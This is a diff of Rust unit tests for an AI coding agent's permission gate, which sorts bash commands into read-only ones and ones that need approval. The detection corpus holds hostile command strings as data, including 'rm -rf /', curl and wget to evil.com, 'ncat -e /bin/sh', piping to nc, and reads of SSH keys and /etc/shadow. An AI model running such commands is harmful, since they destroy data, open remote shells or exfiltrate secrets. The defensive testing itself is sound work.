@@ -620,50 +620,29 @@ mod tests {
     }
 
     #[test]
-    fn git_stash_is_write_gated() {
-        assert_eq!(
-            cloud_gated_tool_kind("git_stash"),
-            Some(CloudGatedToolKind::Write)
-        );
-    }
-
-    #[test]
-    fn git_commit_is_write_gated() {
-        assert_eq!(
-            cloud_gated_tool_kind("git_commit"),
-            Some(CloudGatedToolKind::Write)
-        );
-    }
-
-    #[test]
-    fn git_revert_commit_is_write_gated() {
-        assert_eq!(
-            cloud_gated_tool_kind("git_revert_commit"),
-            Some(CloudGatedToolKind::Write)
-        );
-    }
-
-    #[test]
-    fn delete_file_is_write_gated() {
-        assert_eq!(
-            cloud_gated_tool_kind("delete_file"),
-            Some(CloudGatedToolKind::Write)
-        );
-    }
-
-    #[test]
-    fn github_create_issue_is_write_gated() {
-        assert_eq!(
-            cloud_gated_tool_kind("github_create_issue"),
-            Some(CloudGatedToolKind::Write)
-        );
-    }
-
-    #[test]
-    fn typed_background_task_controls_are_not_cloud_gated() {
-        assert_eq!(cloud_gated_tool_kind("task_output"), None);
-        assert_eq!(cloud_gated_tool_kind("task_list"), None);
-        assert_eq!(cloud_gated_tool_kind("task_stop"), None);
+    fn individual_tool_kind_classification() {
+        // Write-gated tools
+        for tool in &[
+            "git_stash",
+            "git_commit",
+            "git_revert_commit",
+            "delete_file",
+            "github_create_issue",
+        ] {
+            assert_eq!(
+                cloud_gated_tool_kind(tool),
+                Some(CloudGatedToolKind::Write),
+                "{tool} must be write-gated"
+            );
+        }
+        // Background task controls are not cloud-gated
+        for tool in &["task_output", "task_list", "task_stop"] {
+            assert_eq!(
+                cloud_gated_tool_kind(tool),
+                None,
+                "{tool} must not be cloud-gated"
+            );
+        }
     }
 
     // ── bash_command_is_read_only tests ──
@@ -813,143 +792,111 @@ mod tests {
 
     /// Regression: every benign fd redirect pattern in
     /// `strip_benign_fd_redirects` must keep the command read-only. Twin of
-    /// `astra_runtime::bash_intent::benign_fd_redirects_are_not_mutating`;
     /// keep the two corpora aligned.
     #[test]
-    fn benign_fd_redirects_remain_read_only() {
-        assert!(bash_command_is_read_only("cargo check 2>&1"));
-        assert!(bash_command_is_read_only("cargo check 1>&2"));
-        assert!(bash_command_is_read_only("cargo check 2>/dev/null"));
-        assert!(bash_command_is_read_only("cargo check 1>/dev/null"));
-        assert!(bash_command_is_read_only("cargo check >/dev/null"));
-        assert!(bash_command_is_read_only("cargo check &>/dev/null"));
-        // Append-form combined redirect: `&>>` must also be stripped so the
-        // downstream `>>` scan doesn't flag a pure-logging append as mutation.
-        assert!(bash_command_is_read_only("cargo check &>> /tmp/unused_log"));
-        assert!(bash_command_is_read_only("cargo check 2>&1 | head -50"));
-    }
+    fn benign_fd_redirect_handling() {
+        // ── Basic fd redirects are read-only ──
+        for cmd in &[
+            "cargo check 2>&1",
+            "cargo check 1>&2",
+            "cargo check 2>/dev/null",
+            "cargo check 1>/dev/null",
+            "cargo check >/dev/null",
+            "cargo check &>/dev/null",
+            "cargo check &>> /tmp/unused_log",
+            "cargo check 2>&1 | head -50",
+        ] {
+            assert!(
+                bash_command_is_read_only(cmd),
+                "expected read-only: {cmd:?}"
+            );
+        }
 
-    /// Residual-risk guard: after `strip_benign_fd_redirects` removes the
-    /// redirect operator, the surviving target-filename token MUST NOT
-    /// accidentally match any [`WRITE_INDICATORS`] entry. This invariant holds
-    /// today because every file-op indicator carries a trailing space (`"rm "`,
-    /// `"mv "`, …) and shell redirect targets are single whitespace-free
-    /// tokens — but it is load-bearing and silently brittle, so we pin it as
-    /// an adversarial corpus. Twin of
-    /// `astra_runtime::bash_intent::benign_fd_redirect_target_filenames_are_inert`.
-    #[test]
-    fn benign_fd_redirect_target_filenames_are_inert() {
-        // Filenames that textually contain write-indicator substrings.
-        assert!(bash_command_is_read_only("cargo check &>> /tmp/rm_me.log"));
-        assert!(bash_command_is_read_only(
-            "cargo check &>> /var/log/mv_state"
-        ));
-        assert!(bash_command_is_read_only("cargo check &>> ./cp_backup.log"));
-        assert!(bash_command_is_read_only("cargo check &> /tmp/chmod.out"));
-        assert!(bash_command_is_read_only(
-            "cargo check 2> /tmp/git_commit_trace.log"
-        ));
-        // Combined with a pipe-to-reader: still pure read-only plumbing.
-        assert!(bash_command_is_read_only(
-            "cargo check &>> /tmp/rm_me.log && echo done"
-        ));
-        // Malformed tail (no target after `2>`): must not panic and must not
-        // accidentally strip surrounding bytes. Shell itself would error on
-        // a dangling redirect, so we *conservatively* let the surviving `>`
-        // trip the mutation scan — better a false positive on a malformed
-        // command than a silent miss. Pinned here so future "smarter"
-        // stripping must consciously change this contract.
+        // ── Filenames containing write-indicator substrings don't false-positive ──
+        for cmd in &[
+            "cargo check &>> /tmp/rm_me.log",
+            "cargo check &>> /var/log/mv_state",
+            "cargo check &>> ./cp_backup.log",
+            "cargo check &> /tmp/chmod.out",
+            "cargo check 2> /tmp/git_commit_trace.log",
+            "cargo check &>> /tmp/rm_me.log && echo done",
+            "cargo check &>> /tmp/日志.log",
+        ] {
+            assert!(
+                bash_command_is_read_only(cmd),
+                "expected read-only: {cmd:?}"
+            );
+        }
+        // Malformed dangling redirect must trigger mutation scan (fail-closed)
         assert!(!bash_command_is_read_only("cargo check 2>"));
-        // Non-ASCII filename (Chinese path). The byte-level scanner must
-        // preserve the UTF-8 sequence verbatim rather than emit mojibake
-        // that could randomly hit a write-indicator substring.
-        assert!(bash_command_is_read_only("cargo check &>> /tmp/日志.log"));
-    }
 
-    /// Residual-risk guard: fd-redirect detection MUST require a token
-    /// boundary to the **left** of the digit. Without this, a digit that is
-    /// actually part of an argument (`echo a2>/tmp/x` — `a2` is the echo
-    /// argument, `>` is the real stdout redirect writing to `/tmp/x`) would
-    /// be over-stripped and the command would silently read as read-only,
-    /// hiding a genuine workspace mutation. Twin of
-    /// `astra_runtime::bash_intent::fd_redirect_requires_left_token_boundary`.
-    #[test]
-    fn fd_redirect_requires_left_token_boundary() {
-        // `a2>/tmp/x` is `echo`'s argument `a2` plus a real stdout redirect
-        // — the command writes to `/tmp/x`, so it MUST NOT be read-only.
+        // ── Left token boundary requirement ──
         assert!(!bash_command_is_read_only("echo a2>/tmp/x"));
-        // Same with append form.
         assert!(!bash_command_is_read_only("echo a2>>/tmp/x"));
-        // Sanity: a genuine fd redirect (digit at a token boundary) is still
-        // stripped correctly.
-        assert!(bash_command_is_read_only("cargo check 2>/tmp/log"));
-        // Start-of-string digit is a genuine fd specifier.
-        assert!(bash_command_is_read_only("2>/tmp/log cargo check"));
-        // After a pipe / semicolon / `&` / `(` the digit is also a genuine
-        // fd specifier (fresh command token boundary).
-        assert!(bash_command_is_read_only("true | 2>/tmp/log cargo check"));
+        for cmd in &[
+            "cargo check 2>/tmp/log",
+            "2>/tmp/log cargo check",
+            "true | 2>/tmp/log cargo check",
+        ] {
+            assert!(
+                bash_command_is_read_only(cmd),
+                "expected read-only: {cmd:?}"
+            );
+        }
     }
 
     // ── bash_command_approval_reason tests (TDD for rationale surfacing) ──
 
-    /// Read-only commands must return `None` (no approval reason) — the
-    /// reason API must stay in lock-step with `bash_command_is_read_only`.
     #[test]
-    fn approval_reason_none_for_read_only() {
-        assert_eq!(bash_command_approval_reason("ls -la"), None);
-        assert_eq!(
-            bash_command_approval_reason("cargo check 2>&1 | head"),
-            None
-        );
-        assert_eq!(bash_command_approval_reason("git status"), None);
+    fn approval_reason_basics() {
+        // Read-only commands return None
+        for cmd in &["ls -la", "cargo check 2>&1 | head", "git status"] {
+            assert_eq!(
+                bash_command_approval_reason(cmd),
+                None,
+                "{cmd:?} should have no approval reason"
+            );
+        }
+        // Empty / whitespace-only → Empty
+        for cmd in &["", "   "] {
+            assert_eq!(
+                bash_command_approval_reason(cmd),
+                Some(BashApprovalReason::Empty)
+            );
+        }
+        // Shell injection vectors
+        for cmd in &["echo $(rm -rf /)", "echo `rm -rf /`", "ls; rm foo"] {
+            assert_eq!(
+                bash_command_approval_reason(cmd),
+                Some(BashApprovalReason::ShellInjection),
+                "{cmd:?} must surface ShellInjection"
+            );
+        }
+        // display() is non-empty for all variants
+        for v in [
+            BashApprovalReason::Empty,
+            BashApprovalReason::ShellInjection,
+            BashApprovalReason::WriteIndicator(">".to_string()),
+            BashApprovalReason::UnknownPrefix("foobar".to_string()),
+        ] {
+            assert!(
+                !v.display().is_empty(),
+                "display() must be non-empty for {v:?}"
+            );
+        }
     }
 
-    /// Empty / whitespace-only commands must surface [`BashApprovalReason::Empty`].
+    /// Write indicators must surface the matched token and its humanized display.
+    /// Unknown-prefix commands must name the first token with risk-framed display.
     #[test]
-    fn approval_reason_empty_command() {
-        assert_eq!(
-            bash_command_approval_reason(""),
-            Some(BashApprovalReason::Empty)
-        );
-        assert_eq!(
-            bash_command_approval_reason("   "),
-            Some(BashApprovalReason::Empty)
-        );
-    }
-
-    /// Shell injection vectors (`$(`, backtick, `;`) must surface
-    /// [`BashApprovalReason::ShellInjection`] so the approval prompt can
-    /// explain that arbitrary commands could be hidden.
-    #[test]
-    fn approval_reason_shell_injection() {
-        assert_eq!(
-            bash_command_approval_reason("echo $(rm -rf /)"),
-            Some(BashApprovalReason::ShellInjection)
-        );
-        assert_eq!(
-            bash_command_approval_reason("echo `rm -rf /`"),
-            Some(BashApprovalReason::ShellInjection)
-        );
-        assert_eq!(
-            bash_command_approval_reason("ls; rm foo"),
-            Some(BashApprovalReason::ShellInjection)
-        );
-    }
-
-    /// Write indicators must be surfaced with the matched token so the
-    /// approval prompt can display *which* mutation pattern tripped.
-    /// Post-humanization contract: `display()` cites the raw token (so
-    /// power users can correlate) and describes the action in plain
-    /// language. See `approval_reason_write_indicator_display_is_humanized`
-    /// for the full per-indicator phrase contract.
-    #[test]
-    fn approval_reason_write_indicator_names_the_token() {
+    fn approval_reason_ux_contracts() {
+        // ── WriteIndicator: names the matched token ──
         let reason = bash_command_approval_reason("rm -rf /tmp/foo");
-        match reason {
-            Some(BashApprovalReason::WriteIndicator(ref ind)) => {
+        match &reason {
+            Some(BashApprovalReason::WriteIndicator(ind)) => {
                 assert!(
                     !ind.is_empty(),
-                    "write indicator must carry the matched token for display"
+                    "write indicator must carry the matched token"
                 );
                 assert!(
                     ind.trim() == "rm" || ind.starts_with("rm"),
@@ -958,45 +905,18 @@ mod tests {
             }
             other => panic!("expected WriteIndicator, got {other:?}"),
         }
-        // Verify `display()` cites the raw token (trimmed) so power users
-        // can correlate with their command text.
         let display = reason.unwrap().display();
         assert!(
             display.contains("rm"),
-            "display must cite raw token `rm`: {display}"
+            "display must cite raw token: {display}"
         );
-        // And it uses humanized action-oriented prose (not jargon).
         assert!(
             !display.contains("write indicator"),
-            "display must not leak `write indicator` jargon: {display}"
+            "display must not leak jargon: {display}"
         );
-    }
 
-    /// Unknown-prefix commands must name the first token so users can see
-    /// *which* command failed the allowlist check.
-    #[test]
-    fn approval_reason_unknown_prefix_names_first_token() {
-        assert_eq!(
-            bash_command_approval_reason("foobar --flag"),
-            Some(BashApprovalReason::UnknownPrefix("foobar".to_string()))
-        );
-        // Pipeline: first-failing pipe segment's first token is reported.
-        match bash_command_approval_reason("cat file | foobar") {
-            Some(BashApprovalReason::UnknownPrefix(tok)) => {
-                assert_eq!(tok, "foobar");
-            }
-            other => panic!("expected UnknownPrefix(foobar), got {other:?}"),
-        }
-    }
-
-    /// UX: `WriteIndicator::display()` must use action-oriented prose that
-    /// explains *what the command does* rather than leaking the raw token
-    /// name ("write indicator `>` detected" is machine-translation-y and the
-    /// `>` glyph is opaque to non-technical users). Verify humanized
-    /// mappings exist for the most common indicators.
-    #[test]
-    fn approval_reason_write_indicator_display_is_humanized() {
-        let cases = [
+        // ── WriteIndicator display: humanized per-indicator phrases ──
+        let indicator_cases = [
             (">", "writes to a file"),
             (">>", "appends to a file"),
             ("rm ", "deletes files"),
@@ -1005,43 +925,42 @@ mod tests {
             ("chmod ", "changes file permissions"),
             ("npm install", "installs packages"),
         ];
-        for (ind, expected_phrase) in cases {
-            let display = BashApprovalReason::WriteIndicator(ind.to_string()).display();
+        for (ind, expected_phrase) in indicator_cases {
+            let d = BashApprovalReason::WriteIndicator(ind.to_string()).display();
             assert!(
-                display.contains(expected_phrase),
-                "WriteIndicator({ind:?}).display() = {display:?} should contain {expected_phrase:?}"
+                d.contains(expected_phrase),
+                "WriteIndicator({ind:?}) missing {expected_phrase:?}: {d:?}"
             );
-            // Humanized output must still cite the raw token so power users
-            // can correlate with their command text.
             assert!(
-                display.contains(ind.trim()),
-                "humanized display should still cite raw token `{ind}`: {display:?}"
+                d.contains(ind.trim()),
+                "WriteIndicator display must cite raw token `{ind}`: {d:?}"
             );
         }
-    }
 
-    /// UX: `UnknownPrefix::display()` must frame the issue as a *risk* (the
-    /// command may modify the system) rather than as an implementation
-    /// detail ("not in allowlist"). Non-developer users don't know what an
-    /// allowlist is, but they understand "may modify your system".
-    #[test]
-    fn approval_reason_unknown_prefix_display_is_risk_framed() {
-        let display = BashApprovalReason::UnknownPrefix("foobar".to_string()).display();
+        // ── UnknownPrefix: names the first token ──
+        assert_eq!(
+            bash_command_approval_reason("foobar --flag"),
+            Some(BashApprovalReason::UnknownPrefix("foobar".to_string()))
+        );
+        match bash_command_approval_reason("cat file | foobar") {
+            Some(BashApprovalReason::UnknownPrefix(tok)) => assert_eq!(tok, "foobar"),
+            other => panic!("expected UnknownPrefix(foobar), got {other:?}"),
+        }
+
+        // ── UnknownPrefix display: risk-framed, not allowlist jargon ──
+        let ux_display = BashApprovalReason::UnknownPrefix("foobar".to_string()).display();
         assert!(
-            display.contains("foobar"),
-            "display must cite the unknown token: {display}"
+            ux_display.contains("foobar"),
+            "display must cite unknown token: {ux_display}"
+        );
+        let lower = ux_display.to_lowercase();
+        assert!(
+            lower.contains("modify") || lower.contains("unrecognized") || lower.contains("unknown"),
+            "display should frame as risk/unknown, not allowlist: {ux_display}"
         );
         assert!(
-            display.to_lowercase().contains("modify")
-                || display.to_lowercase().contains("unrecognized")
-                || display.to_lowercase().contains("unknown"),
-            "display should frame as risk/unknown, not allowlist jargon: {display}"
-        );
-        // Negative assertion: the old technical-jargon phrase must not
-        // reappear (guards against accidental revert).
-        assert!(
-            !display.contains("allowlist"),
-            "display must not leak `allowlist` jargon: {display}"
+            !ux_display.contains("allowlist"),
+            "display must not leak allowlist jargon: {ux_display}"
         );
     }
 
@@ -1082,57 +1001,32 @@ mod tests {
     // ── Args-aware cloud approval tests ──
 
     #[test]
-    fn bash_git_status_skips_cloud_approval() {
-        let args = serde_json::json!({"command": "git status"});
-        assert!(!edge_tool_requires_cloud_approval_with_args(
-            "bash",
-            Some(&args)
-        ));
-        assert_eq!(cloud_gated_tool_kind_with_args("bash", Some(&args)), None);
-    }
-
-    #[test]
-    fn bash_ls_skips_cloud_approval() {
-        let args = serde_json::json!({"command": "ls -la"});
-        assert!(!edge_tool_requires_cloud_approval_with_args(
-            "bash",
-            Some(&args)
-        ));
-    }
-
-    #[test]
-    fn bash_cargo_check_skips_cloud_approval() {
-        let args = serde_json::json!({"command": "cargo check 2>&1 | head -50"});
-        assert!(!edge_tool_requires_cloud_approval_with_args(
-            "bash",
-            Some(&args)
-        ));
-    }
-
-    #[test]
-    fn bash_rm_requires_cloud_approval() {
-        let args = serde_json::json!({"command": "rm -rf /"});
-        assert!(edge_tool_requires_cloud_approval_with_args(
-            "bash",
-            Some(&args)
-        ));
-        assert_eq!(
-            cloud_gated_tool_kind_with_args("bash", Some(&args)),
-            Some(CloudGatedToolKind::Execute)
-        );
-    }
-
-    #[test]
-    fn bash_git_push_requires_cloud_approval() {
-        let args = serde_json::json!({"command": "git push origin main"});
-        assert!(edge_tool_requires_cloud_approval_with_args(
-            "bash",
-            Some(&args)
-        ));
-    }
-
-    #[test]
-    fn bash_no_args_requires_cloud_approval() {
+    fn bash_args_aware_approval() {
+        // (command, requires_approval, expected_kind)
+        let cases: &[(&str, bool, Option<CloudGatedToolKind>)] = &[
+            ("git status", false, None),
+            ("ls -la", false, None),
+            ("cargo check 2>&1 | head -50", false, None),
+            ("rm -rf /", true, Some(CloudGatedToolKind::Execute)),
+            ("git push origin main", true, None), // None = don't check kind
+            ("", true, None),
+        ];
+        for (cmd, requires, expected_kind) in cases {
+            let args = serde_json::json!({"command": cmd});
+            let result = edge_tool_requires_cloud_approval_with_args("bash", Some(&args));
+            assert_eq!(
+                result, *requires,
+                "bash {cmd:?}: requires_approval mismatch"
+            );
+            if let Some(kind) = expected_kind {
+                assert_eq!(
+                    cloud_gated_tool_kind_with_args("bash", Some(&args)),
+                    Some(*kind),
+                    "bash {cmd:?}: kind mismatch"
+                );
+            }
+        }
+        // No args → requires approval with Execute kind
         assert!(edge_tool_requires_cloud_approval_with_args("bash", None));
         assert_eq!(
             cloud_gated_tool_kind_with_args("bash", None),
@@ -1141,49 +1035,35 @@ mod tests {
     }
 
     #[test]
-    fn bash_empty_command_requires_cloud_approval() {
-        let args = serde_json::json!({"command": ""});
-        assert!(edge_tool_requires_cloud_approval_with_args(
-            "bash",
-            Some(&args)
-        ));
-    }
-
-    #[test]
-    fn read_only_tools_skip_approval_with_args() {
-        let args = serde_json::json!({"file_path": "/foo/bar"});
+    fn args_aware_non_bash_tools() {
+        let file_args = serde_json::json!({"file_path": "/foo/bar"});
+        // Read-only tools skip approval even with args
         assert!(!edge_tool_requires_cloud_approval_with_args(
             "read_file",
-            Some(&args)
+            Some(&file_args)
         ));
         assert!(!edge_tool_requires_cloud_approval_with_args(
             "grep",
-            Some(&args)
+            Some(&file_args)
         ));
-    }
-
-    #[test]
-    fn write_file_still_requires_approval_with_args() {
-        let args = serde_json::json!({"file_path": "/foo/bar", "content": "hello"});
+        // write_file still requires approval
+        let write_args = serde_json::json!({"file_path": "/foo/bar", "content": "hello"});
         assert!(edge_tool_requires_cloud_approval_with_args(
             "write_file",
-            Some(&args)
+            Some(&write_args)
         ));
         assert_eq!(
-            cloud_gated_tool_kind_with_args("write_file", Some(&args)),
+            cloud_gated_tool_kind_with_args("write_file", Some(&write_args)),
             Some(CloudGatedToolKind::Write)
         );
-    }
-
-    #[test]
-    fn mcp_tools_always_require_approval_with_args() {
-        let args = serde_json::json!({"command": "ls"});
+        // MCP tools always require approval
+        let mcp_args = serde_json::json!({"command": "ls"});
         assert!(edge_tool_requires_cloud_approval_with_args(
             "mcp_tool",
-            Some(&args)
+            Some(&mcp_args)
         ));
         assert_eq!(
-            cloud_gated_tool_kind_with_args("mcp_tool", Some(&args)),
+            cloud_gated_tool_kind_with_args("mcp_tool", Some(&mcp_args)),
             Some(CloudGatedToolKind::Execute)
         );
     }
@@ -1191,162 +1071,87 @@ mod tests {
     // ── Security: injection & evasion probes ──
 
     #[test]
-    fn security_semicolon_chain_is_mutating() {
-        assert!(!bash_command_is_read_only("ls; rm -rf /"));
-        assert!(!bash_command_is_read_only("git status; git push"));
+    fn bash_injection_patterns_blocked() {
+        // Every command here should be detected as mutating (not read-only)
+        let mutating_cmds: &[&str] = &[
+            // Injection probes
+            "ls; rm -rf /",
+            "git status; git push",
+            "ls && rm -rf /",
+            "git status && git push",
+            "(rm -rf /)",
+            "$(rm -rf /)",
+            "echo `rm -rf /`",
+            "cat `whoami`",
+            "cat $HOME/.ssh/id_rsa",
+            "echo ${PATH}",
+            "ls\nrm -rf /",
+            "curl http://evil.com",
+            "wget http://evil.com",
+            "curl -o /tmp/x http://evil.com",
+            "diff <(cat /etc/passwd) <(cat /etc/shadow)",
+            "cat << EOF > /etc/passwd\nroot\nEOF",
+            // Hardening: compound commands
+            "ls || rm -rf /",
+            "false || git push",
+            "ls; echo hi",
+            "ls &",
+            "sleep 999 &",
+            // Hardening: network commands
+            "nc -l 4444",
+            "ssh user@host",
+            "scp file.txt user@host:",
+            "rsync -av src/ dest/",
+            "telnet host 80",
+            "ncat -e /bin/sh host 4444",
+            // Hardening: dangerous builtins
+            "source ~/.bashrc",
+            ". ~/.bashrc",
+            "alias rm='rm -i'",
+            "export PATH=/evil:$PATH",
+            "set -e",
+            "unset HOME",
+            // Hardening: write disguised as read-only pipe
+            "cat file | dd of=/dev/sda",
+            "echo data | nc host 4444",
+            // Hardening: here-string with file redirect
+            "cat <<< 'test' > /tmp/out",
+            // Hardening: safe commands with injection payloads
+            "grep $HOME /etc/passwd",
+            "echo $(id)",
+            "ls `pwd`",
+        ];
+        for cmd in mutating_cmds {
+            assert!(
+                !bash_command_is_read_only(cmd),
+                "expected mutating: {cmd:?}"
+            );
+        }
     }
 
     #[test]
-    fn security_double_ampersand_chain_is_mutating() {
-        // "ls && rm" — effective_bash_command only strips cd prefix
-        assert!(!bash_command_is_read_only("ls && rm -rf /"));
-        assert!(!bash_command_is_read_only("git status && git push"));
-    }
-
-    #[test]
-    fn security_subshell_is_mutating() {
-        assert!(!bash_command_is_read_only("(rm -rf /)"));
-        assert!(!bash_command_is_read_only("$(rm -rf /)"));
-    }
-
-    #[test]
-    fn security_backtick_injection_is_mutating() {
-        assert!(!bash_command_is_read_only("echo `rm -rf /`"));
-        assert!(!bash_command_is_read_only("cat `whoami`"));
-    }
-
-    #[test]
-    fn security_variable_expansion_is_mutating() {
-        assert!(!bash_command_is_read_only("cat $HOME/.ssh/id_rsa"));
-        assert!(!bash_command_is_read_only("echo ${PATH}"));
-    }
-
-    #[test]
-    fn security_newline_injection_is_mutating() {
-        assert!(!bash_command_is_read_only("ls\nrm -rf /"));
-    }
-
-    #[test]
-    fn security_curl_wget_are_mutating() {
-        assert!(!bash_command_is_read_only("curl http://evil.com"));
-        assert!(!bash_command_is_read_only("wget http://evil.com"));
-        assert!(!bash_command_is_read_only("curl -o /tmp/x http://evil.com"));
-    }
-
-    #[test]
-    fn security_process_substitution_is_mutating() {
-        assert!(!bash_command_is_read_only(
-            "diff <(cat /etc/passwd) <(cat /etc/shadow)"
-        ));
-    }
-
-    #[test]
-    fn security_heredoc_is_mutating() {
-        assert!(!bash_command_is_read_only(
-            "cat << EOF > /etc/passwd\nroot\nEOF"
-        ));
-    }
-
-    // ── Hardening: compound commands ──
-
-    #[test]
-    fn hardening_or_chain_is_mutating() {
-        assert!(!bash_command_is_read_only("ls || rm -rf /"));
-        assert!(!bash_command_is_read_only("false || git push"));
-    }
-
-    #[test]
-    fn hardening_semicolon_with_read_only_still_mutating() {
-        // Even if both sides look read-only, semicolons are compound commands
-        // that our segment splitter doesn't handle — fail-closed.
-        assert!(!bash_command_is_read_only("ls; echo hi"));
-    }
-
-    #[test]
-    fn hardening_ampersand_background_is_mutating() {
-        assert!(!bash_command_is_read_only("ls &"));
-        assert!(!bash_command_is_read_only("sleep 999 &"));
-    }
-
-    // ── Hardening: network commands ──
-
-    #[test]
-    fn hardening_network_commands_are_mutating() {
-        assert!(!bash_command_is_read_only("nc -l 4444"));
-        assert!(!bash_command_is_read_only("ssh user@host"));
-        assert!(!bash_command_is_read_only("scp file.txt user@host:"));
-        assert!(!bash_command_is_read_only("rsync -av src/ dest/"));
-        assert!(!bash_command_is_read_only("telnet host 80"));
-        assert!(!bash_command_is_read_only("ncat -e /bin/sh host 4444"));
-    }
-
-    // ── Hardening: dangerous builtins ──
-
-    #[test]
-    fn hardening_source_and_dot_are_mutating() {
-        assert!(!bash_command_is_read_only("source ~/.bashrc"));
-        assert!(!bash_command_is_read_only(". ~/.bashrc"));
-    }
-
-    #[test]
-    fn hardening_alias_export_set_are_mutating() {
-        assert!(!bash_command_is_read_only("alias rm='rm -i'"));
-        assert!(!bash_command_is_read_only("export PATH=/evil:$PATH"));
-        assert!(!bash_command_is_read_only("set -e"));
-        assert!(!bash_command_is_read_only("unset HOME"));
-    }
-
-    // ── Hardening: write disguised as read-only pipe ──
-
-    #[test]
-    fn hardening_pipe_to_write_command_is_mutating() {
-        assert!(!bash_command_is_read_only("cat file | dd of=/dev/sda"));
-        assert!(!bash_command_is_read_only("echo data | nc host 4444"));
-    }
-
-    // ── Hardening: here-string without redirect is safe, with redirect is not ──
-
-    #[test]
-    fn hardening_heredoc_without_redirect_detected_by_write_indicator() {
-        // This has > in the heredoc redirect to a file
-        assert!(!bash_command_is_read_only("cat <<< 'test' > /tmp/out"));
-    }
-
-    // ── Hardening: safe commands with injection payloads ──
-
-    #[test]
-    fn hardening_safe_command_with_dollar_in_args_is_mutating() {
-        // grep for a literal $VAR is still flagged because we can't tell
-        // whether the shell will expand it before exec.
-        assert!(!bash_command_is_read_only("grep $HOME /etc/passwd"));
-        assert!(!bash_command_is_read_only("echo $(id)"));
-        assert!(!bash_command_is_read_only("ls `pwd`"));
-    }
-
-    // ── Hardening: legitimate read-only commands still work ──
-
-    #[test]
-    fn hardening_legitimate_read_only_not_broken() {
-        // Ensure the hardening doesn't break normal read-only commands
-        assert!(bash_command_is_read_only("git status"));
-        assert!(bash_command_is_read_only("ls -la"));
-        assert!(bash_command_is_read_only("cat file.txt"));
-        assert!(bash_command_is_read_only("grep -r pattern ."));
-        assert!(bash_command_is_read_only("find . -name '*.rs'"));
-        assert!(bash_command_is_read_only("cargo check 2>&1 | head -50"));
-        assert!(bash_command_is_read_only("cd project && ls"));
-        assert!(bash_command_is_read_only("wc -l file.txt"));
-        assert!(bash_command_is_read_only("git log --oneline -20"));
-        assert!(bash_command_is_read_only("git diff HEAD~3"));
-    }
-
-    // ── Hardening: ensure benign $ patterns don't false positive ──
-
-    #[test]
-    fn hardening_dollar_in_non_variable_position_is_ok() {
-        // Trailing $ or $ followed by non-alpha are benign
-        assert!(bash_command_is_read_only("grep 'price is 5$' file.txt"));
-        assert!(bash_command_is_read_only("grep '$$' file.txt"));
+    fn bash_legitimate_commands_remain_read_only() {
+        let read_only_cmds: &[&str] = &[
+            "git status",
+            "ls -la",
+            "cat file.txt",
+            "grep -r pattern .",
+            "find . -name '*.rs'",
+            "cargo check 2>&1 | head -50",
+            "cd project && ls",
+            "wc -l file.txt",
+            "git log --oneline -20",
+            "git diff HEAD~3",
+            // Benign $ patterns
+            "grep 'price is 5$' file.txt",
+            "grep '$$' file.txt",
+        ];
+        for cmd in read_only_cmds {
+            assert!(
+                bash_command_is_read_only(cmd),
+                "expected read-only: {cmd:?}"
+            );
+        }
     }
 
     #[test]
